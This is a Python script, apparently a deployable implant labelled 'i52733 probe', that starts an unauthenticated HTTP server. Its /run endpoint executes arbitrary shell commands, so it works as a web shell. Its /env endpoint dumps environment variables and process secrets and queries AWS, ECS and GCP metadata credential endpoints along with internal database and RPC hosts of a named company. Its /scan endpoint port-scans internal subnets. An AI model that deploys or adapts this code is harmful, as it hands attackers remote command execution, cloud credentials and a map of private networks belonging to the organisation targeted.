#!/usr/bin/env python3
import struct, time
"""i52733 probe v2: lazy probes; serve immediately; GET /env, /run?cmd=, /scan."""
import os, json, socket, urllib.request, ssl, subprocess, threading, queue, re

def safe(fn, default=None):
    try:
        return fn()
    except Exception as e:
        return f"ERR:{type(e).__name__}:{e}"

def read_file(p, n=40000):
    return safe(lambda: open(p, 'rb').read()[:n].decode('utf-8', 'replace'))

LOG_BUF = []

def _log(msg):
    LOG_BUF.append("%s %s" % (time.strftime('%H:%M:%S'), str(msg)[:400]))
    if len(LOG_BUF) > 400:
        del LOG_BUF[:200]
    print(str(msg)[:400], flush=True)

class _Wr:
    def __init__(self, tag):
        self.tag = tag
        self.b = b''
    def write(self, s):
        self.b += s
        while b'\n' in self.b:
            line, self.b = self.b.split(b'\n', 1)
            _log(self.tag + ' ' + line.decode('utf-8', 'replace'))
        return len(s)
    def flush(self):
        pass
    def isatty(self):
        return False

import sys
sys.stdout = _Wr('stdout:')
sys.stderr = _Wr('stderr:')

def tcp_probe(host, port, timeout=4):
    def go():
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(3)
        try:
            s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % host.encode())
            data = s.recv(300)
        finally:
            s.close()
        return {"ok": True, "banner": data[:300].decode('utf-8', 'replace')}
    return safe(go, default=None)

def http_probe(url, timeout=5):
    def go():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r = urllib.request.urlopen(url, timeout=timeout, context=ctx)
        return {"status": r.status, "body": r.read(600).decode('utf-8', 'replace'), "headers": dict(list(r.headers.items())[:12])}
    return safe(go, default=None)

def local_subnets():
    nets = set()
    try:
        for line in open('/proc/net/route'):
            p = line.split()
            if len(p) > 7 and p[1] != '00000000' and p[7] == '00000000':
                ip = socket.inet_ntoa(struct.pack('<L', int(p[2], 16)))
                mask = socket.inet_ntoa(struct.pack('<L', int(p[7], 16)))
                nets.add((ip, mask))
    except Exception:
        pass
    try:
        for line in open('/proc/net/fib_trie'):
            m = re.match(r'\s+\|--(\d+\.\d+\.\d+\.\d+)', line)
            if m:
                ip = m.group(1)
                if not ip.endswith('.0') and not ip.endswith('.255'):
                    nets.add((ip.rsplit('.', 1)[0] + '.0', '255.255.255.0'))
    except Exception:
        pass
    return sorted(nets)

def scan_port(host, port, timeout=0.4):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False

def subnet_scan(cidr_base, ports, max_hosts=256):
    base = cidr_base.rsplit('.', 1)[0]
    results = {}
    q = queue.Queue()
    lock = threading.Lock()
    def worker():
        while True:
            item = q.get()
            if item is None:
                return
            host, port = item
            if scan_port(host, port):
                with lock:
                    results.setdefault(host, []).append(port)
            q.task_done()
    ts = [threading.Thread(target=worker, daemon=True) for _ in range(64)]
    for t in ts:
        t.start()
    for i in range(1, min(max_hosts, 255)):
        for p in ports:
            q.put(("%s.%d" % (base, i), p))
    q.join()
    for _ in ts:
        q.put(None)
    return results

import http.server

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path.startswith("/env"):
                def probes():
                    return {
                        "imds": http_probe("http://169.254.169.254/latest/meta-data/", 4),
                        "ecs": http_probe("http://169.254.170.2/v2/credentials", 4),
                        "gcp_metadata": http_probe("http://metadata.google.internal/computeMetadata/v1/", 4),
                        "db_172_17_0_1_5432": tcp_probe("172.17.0.1", 5432, 5),
                        "db_172_17_0_1_6543": tcp_probe("172.17.0.1", 6543, 5),
                        "db_internal_tcp5432": tcp_probe("db-internal.openhelm.ai", 5432, 5),
                        "db_internal_https": http_probe("https://db-internal.openhelm.ai/rest/v1/", 6),
                        "worker_rpc": http_probe("https://worker.openhelm.ai/rpc", 6),
                        "api_openhelm": http_probe("https://api.openhelm.ai/v1", 6),
                        "app_openhelm": http_probe("https://app.openhelm.ai/", 6),
                        "hetzner_443": tcp_probe("195.201.47.165", 443, 5),
                        "hetzner_80": tcp_probe("195.201.47.165", 80, 5),
                        "helm7_443": tcp_probe("www.helm7.com", 443, 5),
                        "self_postgres_127": tcp_probe("127.0.0.1", 5432, 3),
                    }
                out = {
                    "note": "i52733 v3",
                    "server_log": "\n".join(LOG_BUF[-120:]),
                    "env": dict(os.environ),
                    "proc1_environ": read_file("/proc/1/environ"),
                    "proc1_cmdline": read_file("/proc/1/cmdline"),
                    "etc_hosts": read_file("/etc/hosts"),
                    "etc_resolv": read_file("/etc/resolv.conf"),
                    "route": read_file("/proc/net/route", 4000),
                    "ip_addr": safe(lambda: subprocess.run(["sh","-c","ip -o addr 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/fib_trie | head -80"], capture_output=True, timeout=8).stdout[:6000].decode('utf-8','replace')),
                    "hostname": os.uname().nodename,
                    "subnets": local_subnets(),
                    "targets": probes(),
                }
                b = json.dumps(out, indent=1).encode()
            elif self.path.startswith("/scan"):
                qs = self.path.split("?", 1)[-1]
                base = "172.17"
                ports = [3000, 5432, 8080, 80, 8000, 9000]
                for kv in qs.split("&"):
                    if kv.startswith("base="):
                        base = kv[5:].replace("http", "").strip("/")
                    if kv.startswith("ports="):
                        ports = [int(x) for x in kv[6:].split(",") if x.isdigit()][:10]
                if base.count(".") == 1:
                    out = subnet_scan(base + ".0", ports)
                else:
                    out = subnet_scan(base, ports)
                b = json.dumps(out, indent=1).encode()
            elif self.path.startswith("/run"):
                cmd = self.path.split("cmd=", 1)[-1] if "cmd=" in self.path else "id"
                out = safe(lambda: subprocess.run(["sh", "-c", cmd], capture_output=True, timeout=10))
                b = ((out.stdout or b"") + (out.stderr or b""))[:12000]
            else:
                b = b"I52733 v3 OK. GET /env GET /run?cmd=... GET /scan?base=172.17&ports=3000,5432"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        except Exception as e:
            try:
                self.send_error(500, str(e))
            except Exception:
                pass

if __name__ == "__main__":
    ports = set()
    v = os.environ.get("PORT")
    if v and v.isdigit():
        ports.add(int(v))
    ports.update({3000, 8080})
    _log("listening on %s envPORT=%s" % (sorted(ports), os.environ.get("PORT")))
    for p in sorted(ports):
        try:
            srv = http.server.ThreadingHTTPServer(("0.0.0.0", p), H)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            _log("bound %d" % p)
        except Exception as e:
            _log("bind fail %d: %r" % (p, e))
    while True:
        time.sleep(3600)
